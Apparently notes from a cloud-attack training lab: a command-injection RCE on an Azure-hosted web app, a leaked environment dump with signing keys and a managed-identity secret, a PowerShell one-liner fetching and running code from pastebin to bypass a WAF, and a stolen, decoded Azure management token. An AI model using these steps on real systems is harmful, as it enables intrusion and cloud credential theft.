# Attack lab 10

Access to the new target application:
```
https://analytics.pharmacorphq.com/
```

Detect a new RCE vulnerability:

```
                    <pre>ACTION=startAZURE_ENV_INITIALIZED=C:\Program Files\apache-tomcat-9.0.65\bin\
AZURE_LOGGING_DIR=C:\home/LogFilesAZURE_SITE_APP_BASE=C:\home/site/wwwroot/webapps
AZURE_SITE_HOME=C:\homeAZURE_SITE_LIBS_DIR=C:\home/site/libsAZURE_UNPACK_WARS=true
CATALINA_BASE=C:\Program Files\apache-tomcat-9.0.65
CATALINA_HOME=C:\Program Files\apache-tomcat-9.0.65
CATALINA_LOGGING_CONFIG=-Djava.util.logging.config.file="C:\Program Files\apache-tomcat-9.0.65\conf\logging.properties"
CATALINA_OPTS= -DuseEncodedApplogs=trueCATALINA_TMPDIR=C:\local\TempCLASSPATH=C:\Program Files\apache-tomcat-9.0.65\lib\servlet-api.jar;
C:\Program Files\apache-tomcat-9.0.65\lib\azure.appservice.jar;C:\Program Files\apache-tomcat-9.0.65\bin\bootstrap.jar;
C:\Program Files\apache-tomcat-9.0.65\bin\tomcat-juli.jarCURRENT_DIR=C:\home\site\wwwrootENDORSED_PROP=ignore.endorsed.dirs
JAVA_OPTS=-Dcatalina.valves.showReport=False -Dcatalina.valves.showServerInfo=False -Dcatalina.maxConnections=10000 -Dcatalina.maxThreads=200
-Dsite.logdir=C:/home/LogFiles -Dsite.home=C:/home -Dsite.libs=C:/home/site/libs -Dsite.appbase=C:/home/site/wwwroot/webapps -Dsite.xmlbase=C:/home/site/wwwroot
-Dsite.unpackwars=true -Dsite.tempdir=C:\local\Temp -Dcatalina.instance.name=997260270c326e2938e72fa9af69674fa8b4402f8e9e65121c461d08eb0abce6
-Dport.http=12226 -Djava.net.preferIPv4Stack=true -noverify -Dsite.logRetentionDays=0 -Dsite.logRotatable=true -Dsite.connectionTimeout=240000
-Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
JAVA_TMP_DIR=C:\local\TempJDK_JAVA_OPTIONS= --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED
--add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/java.util.concurrent=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
JRE_HOME=C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u345JSSE_OPTS=-Djdk.tls.ephemeralDHKeySize=2048
LOGGING_MANAGER=-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManagerMAINCLASS=org.apache.catalina.startup.BootstrapPROMPT=$P$GSystemDrive=
C:ProgramFiles(x86)=C:\Program Files (x86)ProgramW6432=C:\Program FilesPROCESSOR_IDENTIFIER=Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
DOTNET_HOSTING_OPTIMIZATION_CACHE=C:\DotNetCache
PROCESSOR_ARCHITECTURE=AMD64
Path=C:\Python27;C:\Program Files (x86)\nodejs;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Program Files\Microsoft Network Monitor 3\;C:\Program Files\dotnet;C:\Program Files (x86)\dotnet;C:\Program Files\Git\cmd;
C:\Users\packer\AppData\Roaming\npm;C:\Program Files (x86)\nodejs\;C:\Program Files (x86)\Mercurial\;C:\Program Files (x86)\Microsoft ASP.NET\ASP.NET Web
Pages\v1.0\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps;C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u345\bin;
AZURE_TOMCAT7_CMDLINE=-Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file="C:\Program Files (x86)\apache-tomcat-7.0.94\conf\logging.properties"
-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir="d:/home/LogFiles/" -Dsite.tempdir="d:\home\site\workdir"
-classpath "C:\Program Files (x86)\apache-tomcat-7.0.94\bin\bootstrap.jar;C:\Program Files (x86)\apache-tomcat-7.0.94\bin\tomcat-juli.jar"
-Dcatalina.base="C:\Program Files (x86)\apache-tomcat-7.0.94" -Djava.io.tmpdir="d:\home\site\workdir"
org.apache.catalina.startup.BootstrapRoleInstanceId=dw0SmallDedicatedWebWorkerRole_8889AZURE_TOMCAT85_CMDLINE="-noverify
-Djava.net.preferIPv4Stack=true -Dcatalina.instance.name=%WEBSITE_INSTANCE_ID% -Dport.http=%HTTP_PLATFORM_PORT%
-Djava.util.logging.config.file=\"C:\Program Files\apache-tomcat-8.5.57\conf\logging.properties\" -
Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir=\"%HOME%\LogFiles\\" -Dsite.tempdir=\"%HOME%\site\workdir\"
-classpath \"C:\Program Files\apache-tomcat-8.5.57\bin\bootstrap.jar;C:\Program Files\apache-tomcat-8.5.57\bin\tomcat-juli.jar\"
-Dcatalina.base=\"C:\Program Files\apache-tomcat-8.5.57\" -Djava.io.tmpdir=\"%HOME%\site\workdir\" org.apache.catalina.startup.Bootstrap"
AZURE_TOMCAT90_HOME=C:\Program Files\apache-tomcat-9.0.37
PROCESSOR_REVISION=4f01TEMP=C:\local\Temp
USERPROFILE=C:\local\UserProfileUSERNAME=dw0sdwk0006UX$SystemRoot=C:\Windows
AZURE_TOMCAT85_HOME=C:\Program Files\apache-tomcat-8.5.57
AZURE_TOMCAT7_HOME=C:\Program Files (x86)\apache-tomcat-7.0.94AZURE_JETTY9_CMDLINE=-Djava.net.preferIPv4Stack=true -Djetty.port=%HTTP_PLATFORM_PORT%
-Djetty.base="D:\Program Files (x86)\jetty-distribution-9.1.0.v20131115" -Djetty.webapps="d:\home\site\wwwroot\webapps"
-jar "D:\Program Files (x86)\jetty-distribution-9.1.0.v20131115\start.jar" etc\jetty-logging.xmlCommon
ProgramFiles=C:\Program Files\Common FilesProgramData=C:\local\ProgramData
AZURE_JETTY93_HOME=C:\Program Files (x86)\jetty-distribution-9.3.25.v20180904COMPUTERNAME=dw0sdwk0006UXRoleName=dw0SmallDedicatedWebWorkerRole
AZURE_TOMCAT10_HOME=C:\Program Files\apache-tomcat-10.0.12CommonProgramW6432=C:\Program Files\Common Files
AZURE_JETTY9_HOME=C:\Program Files (x86)\jetty-distribution-9.1.0.v20131115AZURE_TOMCAT90_CMDLINE="-noverify -Djava.net.preferIPv4Stack=true
-Dcatalina.instance.name=%WEBSITE_INSTANCE_ID% -Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file=
\"C:\Program Files\apache-tomcat-9.0.37\conf\logging.properties\" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
-Dsite.logdir=\"%HOME%\LogFiles\\" -Dsite.tempdir=\"%HOME%\site\workdir\" -classpath \"C:\Program Files\apache-tomcat-9.0.37\bin\bootstrap.jar;
C:\Program Files\apache-tomcat-9.0.37\bin\tomcat-juli.jar\" -Dcatalina.base=\"C:\Program Files\apache-tomcat-9.0.37\"
-Djava.io.tmpdir=\"%HOME%\site\workdir\" org.apache.catalina.startup.Bootstrap"TMP=C:\local\TempRoleRoot=E:AZURE_JETTY93_CMDLINE=-Djava.net.preferIPv4Stack=true
 -Djetty.port=%HTTP_PLATFORM_PORT% -Djetty.base="D:\Program Files (x86)\jetty-distribution-9.3.25.v20180904" -Djetty.webapps="d:\home\site\wwwroot\webapps"
-jar "D:\Program Files (x86)\jetty-distribution-9.3.25.v20180904\start.jar" etc\jetty-logging.xmlCommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
AZURE_TOMCAT10_CMDLINE=-noverify -Djava.net.preferIPv4Stack=true -Dcatalina.instance.name=%WEBSITE_INSTANCE_ID% -Dport.http=%HTTP_PLATFORM_PORT%
-Djava.util.logging.config.file="C:\Program Files\apache-tomcat-10.0.12\conf\logging.properties"
-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir="d:/home/LogFiles/" -Dsite.tempdir="d:\home\site\workdir"
-classpath "C:\Program Files\apache-tomcat-10.0.12\bin\bootstrap.jar;C:\Program Files\apache-tomcat-10.0.12\bin\tomcat-juli.jar"
-Dcatalina.base="C:\Program Files\apache-tomcat-10.0.12" -Djava.io.tmpdir="d:\home\site\workdir" org.apache.catalina.startup.Bootstrap
WEBSITE_CATALINA_MAXCONNECTIONS=10000WEBSITE_CATALINA_MAXTHREADS=200WEBSITE_HTTPLOGGING_RETENTION_DAYS=0
WEBSITE_TOMCAT_CONNECTION_TIMEOUT=240000
WEBSITE_TOMCAT_LOGS_ROTATABLE=truewindir=C:\Windows
NUMBER_OF_PROCESSORS=1OS=Windows_NT
ProgramFiles=C:\Program FilesComSpec=C:\Windows\system32\cmd.exe
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL;.PY;.
PYWAZURE_TOMCAT8_CMDLINE=-Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file="C:\Program Files (x86)\apache-tomcat-8.0.53\conf\logging.properties"
-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir="d:/home/LogFiles/" -Dsite.tempdir="d:\home\site\workdir"
-classpath "C:\Program Files (x86)\apache-tomcat-8.0.53\bin\bootstrap.jar;C:\Program Files (x86)\apache-tomcat-8.0.53\bin\tomcat-juli.jar"
-Dcatalina.base="C:\Program Files (x86)\apache-tomcat-8.0.53" -Djava.io.tmpdir="d:\home\site\workdir" org.apache.catalina.startup.Bootstrap
ALLUSERSPROFILE=C:\local\ProgramDataPSModulePath=C:\Program Files\WindowsPowerShell\Modules;
C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files\WindowsPowerShell\Modules\;
C:\Program Files (x86)\Microsoft SDKs\Azure\PowerShell\ResourceManager\AzureResourceManager\;
C:\Program Files (x86)\Microsoft SDKs\Azure\PowerShell\ServiceManagement\;C:\Program Files (x86)\Microsoft SDKs\Azure\PowerShell\Storage\;
C:\Program Files\Microsoft Message Analyzer\PowerShell\APPDATA=C:\local\AppData
USERDOMAIN=WORKGROUPPROCESSOR_LEVEL=6LOCALAPPDATA=C:\local\LocalAppDataResource
Drive=D:\AZURE_TOMCAT8_HOME=C:\Program Files (x86)\apache-tomcat-8.0.53PUBLIC=C:\Users\PublicScmType=NoneAPPSETTING_ScmType=None
WEBSITE_SITE_NAME=analyticspharmacorpAPPSETTING_WEBSITE_SITE_NAME=analyticspharmacorpWEBSITE_AUTH_ENABLED=False
APPSETTING_WEBSITE_AUTH_ENABLED=False
REMOTEDEBUGGINGVERSION=16.0.30709.132
APPSETTING_REMOTEDEBUGGINGVERSION=16.0.30709.132
FUNCTIONS_RUNTIME_SCALE_MONITORING_ENABLED=0
APPSETTING_FUNCTIONS_RUNTIME_SCALE_MONITORING_ENABLED=0
WEBSITE_AUTH_LOGOUT_PATH=/.auth/logout
APPSETTING_WEBSITE_AUTH_LOGOUT_PATH=/.auth/logoutWEBSITE_AUTH_AUTO_AAD=False
APPSETTING_WEBSITE_AUTH_AUTO_AAD=False
REGION_NAME=France Central
HOME=C:\home
HOME_EXPANDED=D:\DWASFiles\Sites\analyticspharmacorp\VirtualDirectory0
LOCAL_EXPANDED=D:\DWASFiles\Sites\analyticspharmacorp
windows_tracing_flags=windows_tracing_logfile=
WEBSITE_INSTANCE_ID=997260270c326e2938e72fa9af69674fa8b4402f8e9e65121c461d08eb0abce6
WEBSITE_HTTPLOGGING_ENABLED=0WEBSITE_SCM_ALWAYS_ON_ENABLED=1WEBSITE_ISOLATION=pico
WEBSITE_OS=windows
WEBSITE_DEPLOYMENT_ID=analyticspharmacorp
WEBSITE_INFRASTRUCTURE_IP=10.10.0.118
WEBSITE_COMPUTE_MODE=DedicatedWEBSITE_SKU=Basic
WEBSITE_ELASTIC_SCALING_ENABLED=0
WEBSITE_SCM_SEPARATE_STATUS=1
WEBSITE_IIS_SITE_NAME=analyticspharmacorp
WEBSITE_APPSERVICEAPPLOGS_TRACE_ENABLED=true
WEBSITE_CHANGEANALYSISSCAN_ENABLED=1MicrosoftInstrumentationEngine_LatestPath=C:\Program Files (x86)\SiteExtensions\InstrumentationEngine\1.0.43
JAVA_HOME=C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u345
SITE_BITNESS=x86
WEBSITE_AUTH_ENCRYPTION_KEY=FC8E438475F00427819DB182616D53741FAFEA859E7310EB693BAF1F5A4DCB0F
WEBSITE_AUTH_SIGNING_KEY=7B45FA4108334C68A07D3D6A1627A95E8A171A535ABDEB6162C8EDB0A1F848CE
WEBSITE_PROACTIVE_AUTOHEAL_ENABLED=TrueWEBSITE_PROACTIVE_STACKTRACING_ENABLED=True
WEBSITE_PROACTIVE_CRASHMONITORING_ENABLED=True
WEBSITE_CRASHMONITORING_USE_DEBUGDIAG=True
WEBSITE_DYNAMIC_CACHE=1WEBSITE_FRAMEWORK_JIT=1
WEBSITE_HOME_STAMPNAME=waws-prod-par-021
WEBSITE_CURRENT_STAMPNAME=waws-prod-par-021
WEBSOCKET_CONCURRENT_REQUEST_LIMIT=350
WEBSITE_VOLUME_TYPE=PrimaryStorageVolume
WEBSITE_OWNER_NAME=aac02f74-b0d2-45d2-8fbc-8d33f274116f+Analytics-FranceCentralwebspace
WEBSITE_RESOURCE_GROUP=analytics
WEBSITE_CONTAINER_READY=1
WEBSITE_PHYSICAL_MEMORY_MB=2047
WEBSITE_JAVA_MAX_HEAP_MB=1432
WEBSITE_STACK=TOMCATWEBSITE_PLATFORM_VERSION=100.0.7.517
REMOTEDEBUGGINGPORT=REMOTEDEBUGGINGBITVERSION=vx86
WEBSITE_LOCALCACHE_ENABLED=False
WEBSITE_HOSTNAME=analyticspharmacorp.azurewebsites.net
WEBSITE_RELAYS=WEBSITE_REWRITE_TABLE=MSI_ENDPOINT=http://127.0.0.1:41693/msi/token/MSI_SECRET=03B4C9B76E004F11ADA50DAC8CFE4753
IDENTITY_ENDPOINT=http://127.0.0.1:41693/msi/token/
IDENTITY_HEADER=03B4C9B76E004F11ADA50DAC8CFE4753
HTTP_PLATFORM_PORT=12226
_EXECJAVA="C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u345\bin\java.exe"
_RUNJAVA="C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u345\bin\java.exe"
_RUNJDB="C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u345\bin\jdb.exe"
</pre>                    

```
The impeortant fields:

```
WEBSITE_RELAYS=WEBSITE_REWRITE_TABLE=MSI_ENDPOINT=http://127.0.0.1:41693/msi/token/MSI_SECRET=03B4C9B76E004F11ADA50DAC8CFE4753
IDENTITY_ENDPOINT=http://127.0.0.1:41693/msi/token/
IDENTITY_HEADER=03B4C9B76E004F11ADA50DAC8CFE4753
```
It's possible perform an operation in order to obtain an authentication token with the the application identity resource object:

```
curl "http://127.0.0.1:41693/MSI/token/?resource="https://management.azure.com"&api-version=2017-09-01" -H secret:"03B4C9B76E004F11ADA50DAC8CFE4753"
```

But the application WAF block the connection:
In order to bypass the WAF application, there are two options. 
1. use pastebin:
create new pastebin public content
```
https://pastebin.com/raw/ncT5fh5D

$headers = @{'secret' = '03B4C9B76E004F11ADA50DAC8CFE4753'}
Invoke-RestMethod -Method GET -Uri "http://127.0.0.1:41693/MSI/token/?resource=https://management.azure.com&api-version=2017-09-01" -Headers $headers
```
Invoke from the pharmacorp Azure machine to pastebin raw url:
```
https://analytics.pharmacorphq.com/main?inputUser=powershell%20-c%20IEX%20(irm%20%27https://pastebin.com/raw/ncT5fh5D%27)&category-color=success
```
The access token response:
```
access_token :
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1LSTNROW5OUjdiUm9m
eG1lWm9YcWJIWkdldyIsImtpZCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdl               
dyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjo               
iaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvZTBmOTk5YzEtODZlZS00N2EwLWJmZDU               
tMTg0NzAxNTRiN2NkLyIsImlhdCI6MTY5Njc4NDQxOSwibmJmIjoxNjk2Nzg0NDE               
5LCJleHAiOjE2OTY4NzExMTksImFpbyI6IkUyRmdZR0RLa1AxOFh1ZE1xa2ZaeXU               
4dGRkY2lBUT09IiwiYXBwaWQiOiIzMzI5ZmVhNy02NDJlLTRjMDktYjFhZC1kOGV               
kYmUxNDAyNjciLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5               
kb3dzLm5ldC9lMGY5OTljMS04NmVlLTQ3YTAtYmZkNS0xODQ3MDE1NGI3Y2QvIiw               
iaWR0eXAiOiJhcHAiLCJvaWQiOiI3ZGY5YWU1Ny0zZWI5LTQzN2MtYTBlMi03MTQ               
yODM3ODRjZGQiLCJyaCI6IjAuQVhFQXdabjU0TzZHb0VlXzFSaEhBVlMzelVaSWY               
za0F1dGRQdWtQYXdmajJNQk9IQUFBLiIsInN1YiI6IjdkZjlhZTU3LTNlYjktNDM               
3Yy1hMGUyLTcxNDI4Mzc4NGNkZCIsInRpZCI6ImUwZjk5OWMxLTg2ZWUtNDdhMC1               
iZmQ1LTE4NDcwMTU0YjdjZCIsInV0aSI6IklTdWFheVBQVFV5c1hFbE80ajQ5QUE               
iLCJ2ZXIiOiIxLjAiLCJ4bXNfY2FlIjoiMSIsInhtc19taXJpZCI6Ii9zdWJzY3J               
pcHRpb25zL2FhYzAyZjc0LWIwZDItNDVkMi04ZmJjLThkMzNmMjc0MTE2Zi9yZXN               
vdXJjZWdyb3Vwcy9BbmFseXRpY3MvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l               
0ZXMvYW5hbHl0aWNzcGhhcm1hY29ycCIsInhtc190Y2R0IjoiMTY1NTM1MzYyOCJ
9.PDuxy0ZHbTK3L1DhVI6C6MfCJow1VvF5Xjrwm2CGGbJpU89Qnr_5S2F9P1EBYN
rUmChq7FX4mRss7EsWFUbTY-jAr3ZAdGNxJo1FknBMPmDC7ZoSxV3aLZ8JBNWH4S
ZtUrh6rlBC8T2020jyPCDb4tWug6xcskRsJyORKovm2OxKsbS-0f8AkrWeqXGdVh
wQM3YjPW4Gg-Jv4JTRVRvwho2NCLkhNUYKIcVUFIIFeoPS5GLBHWjXjh7zCC1paG
8noVBaX15DAnroeS_N__LlDzmTN8geyuCyCDWvqSKufZU7zc-AtNH_zUa49eC8XF
ue94j8siuXEGk1OE6cqGcoyg
expires_on   : 10/9/2023 5:05:18 PM +00:00
resource     : https://management.azure.comtoken_type   :
Bearerclient_id    : 3329FEA7-642E-4C09-B1AD-D8EDBE140267

```
JWT token decoded:

```
{
  "typ": "JWT",
  "alg": "RS256",
  "x5t": "-KI3Q9nNR7bRofxmeZoXqbHZGew",
  "kid": "-KI3Q9nNR7bRofxmeZoXqbHZGew"
}
{
  "aud": "https://management.azure.com",
  "iss": "https://sts.windows.net/e0f999c1-86ee-47a0-bfd5-18470154b7cd/",
  "iat": 1696784419,
  "nbf": 1696784419,
  "exp": 1696871119,
  "aio": "E2FgYGDKkP18XudMqkfZyu8tddciAQ==",
  "appid": "3329fea7-642e-4c09-b1ad-d8edbe140267",
  "appidacr": "2",
  "idp": "https://sts.windows.net/e0f999c1-86ee-47a0-bfd5-18470154b7cd/",
  "idtyp": "app",
  "oid": "7df9ae57-3eb9-437c-a0e2-714283784cdd",
  "rh": "0.AXEAwZn54O6GoEe_1RhHAVS3zUZIf3kAutdPukPawfj2MBOHAAA.",
  "sub": "7df9ae57-3eb9-437c-a0e2-714283784cdd",
  "tid": "e0f999c1-86ee-47a0-bfd5-18470154b7cd",
  "uti": "ISuaayPPTUysXElO4j49AA",
  "ver": "1.0",
  "xms_cae": "1",
  "xms_mirid": "/subscriptions/aac02f74-b0d2-45d2-8fbc-8d33f274116f/resourcegroups/Analytics/providers/Microsoft.Web/sites/analyticspharmacorp",
  "xms_tcdt": "1655353628"
}
```
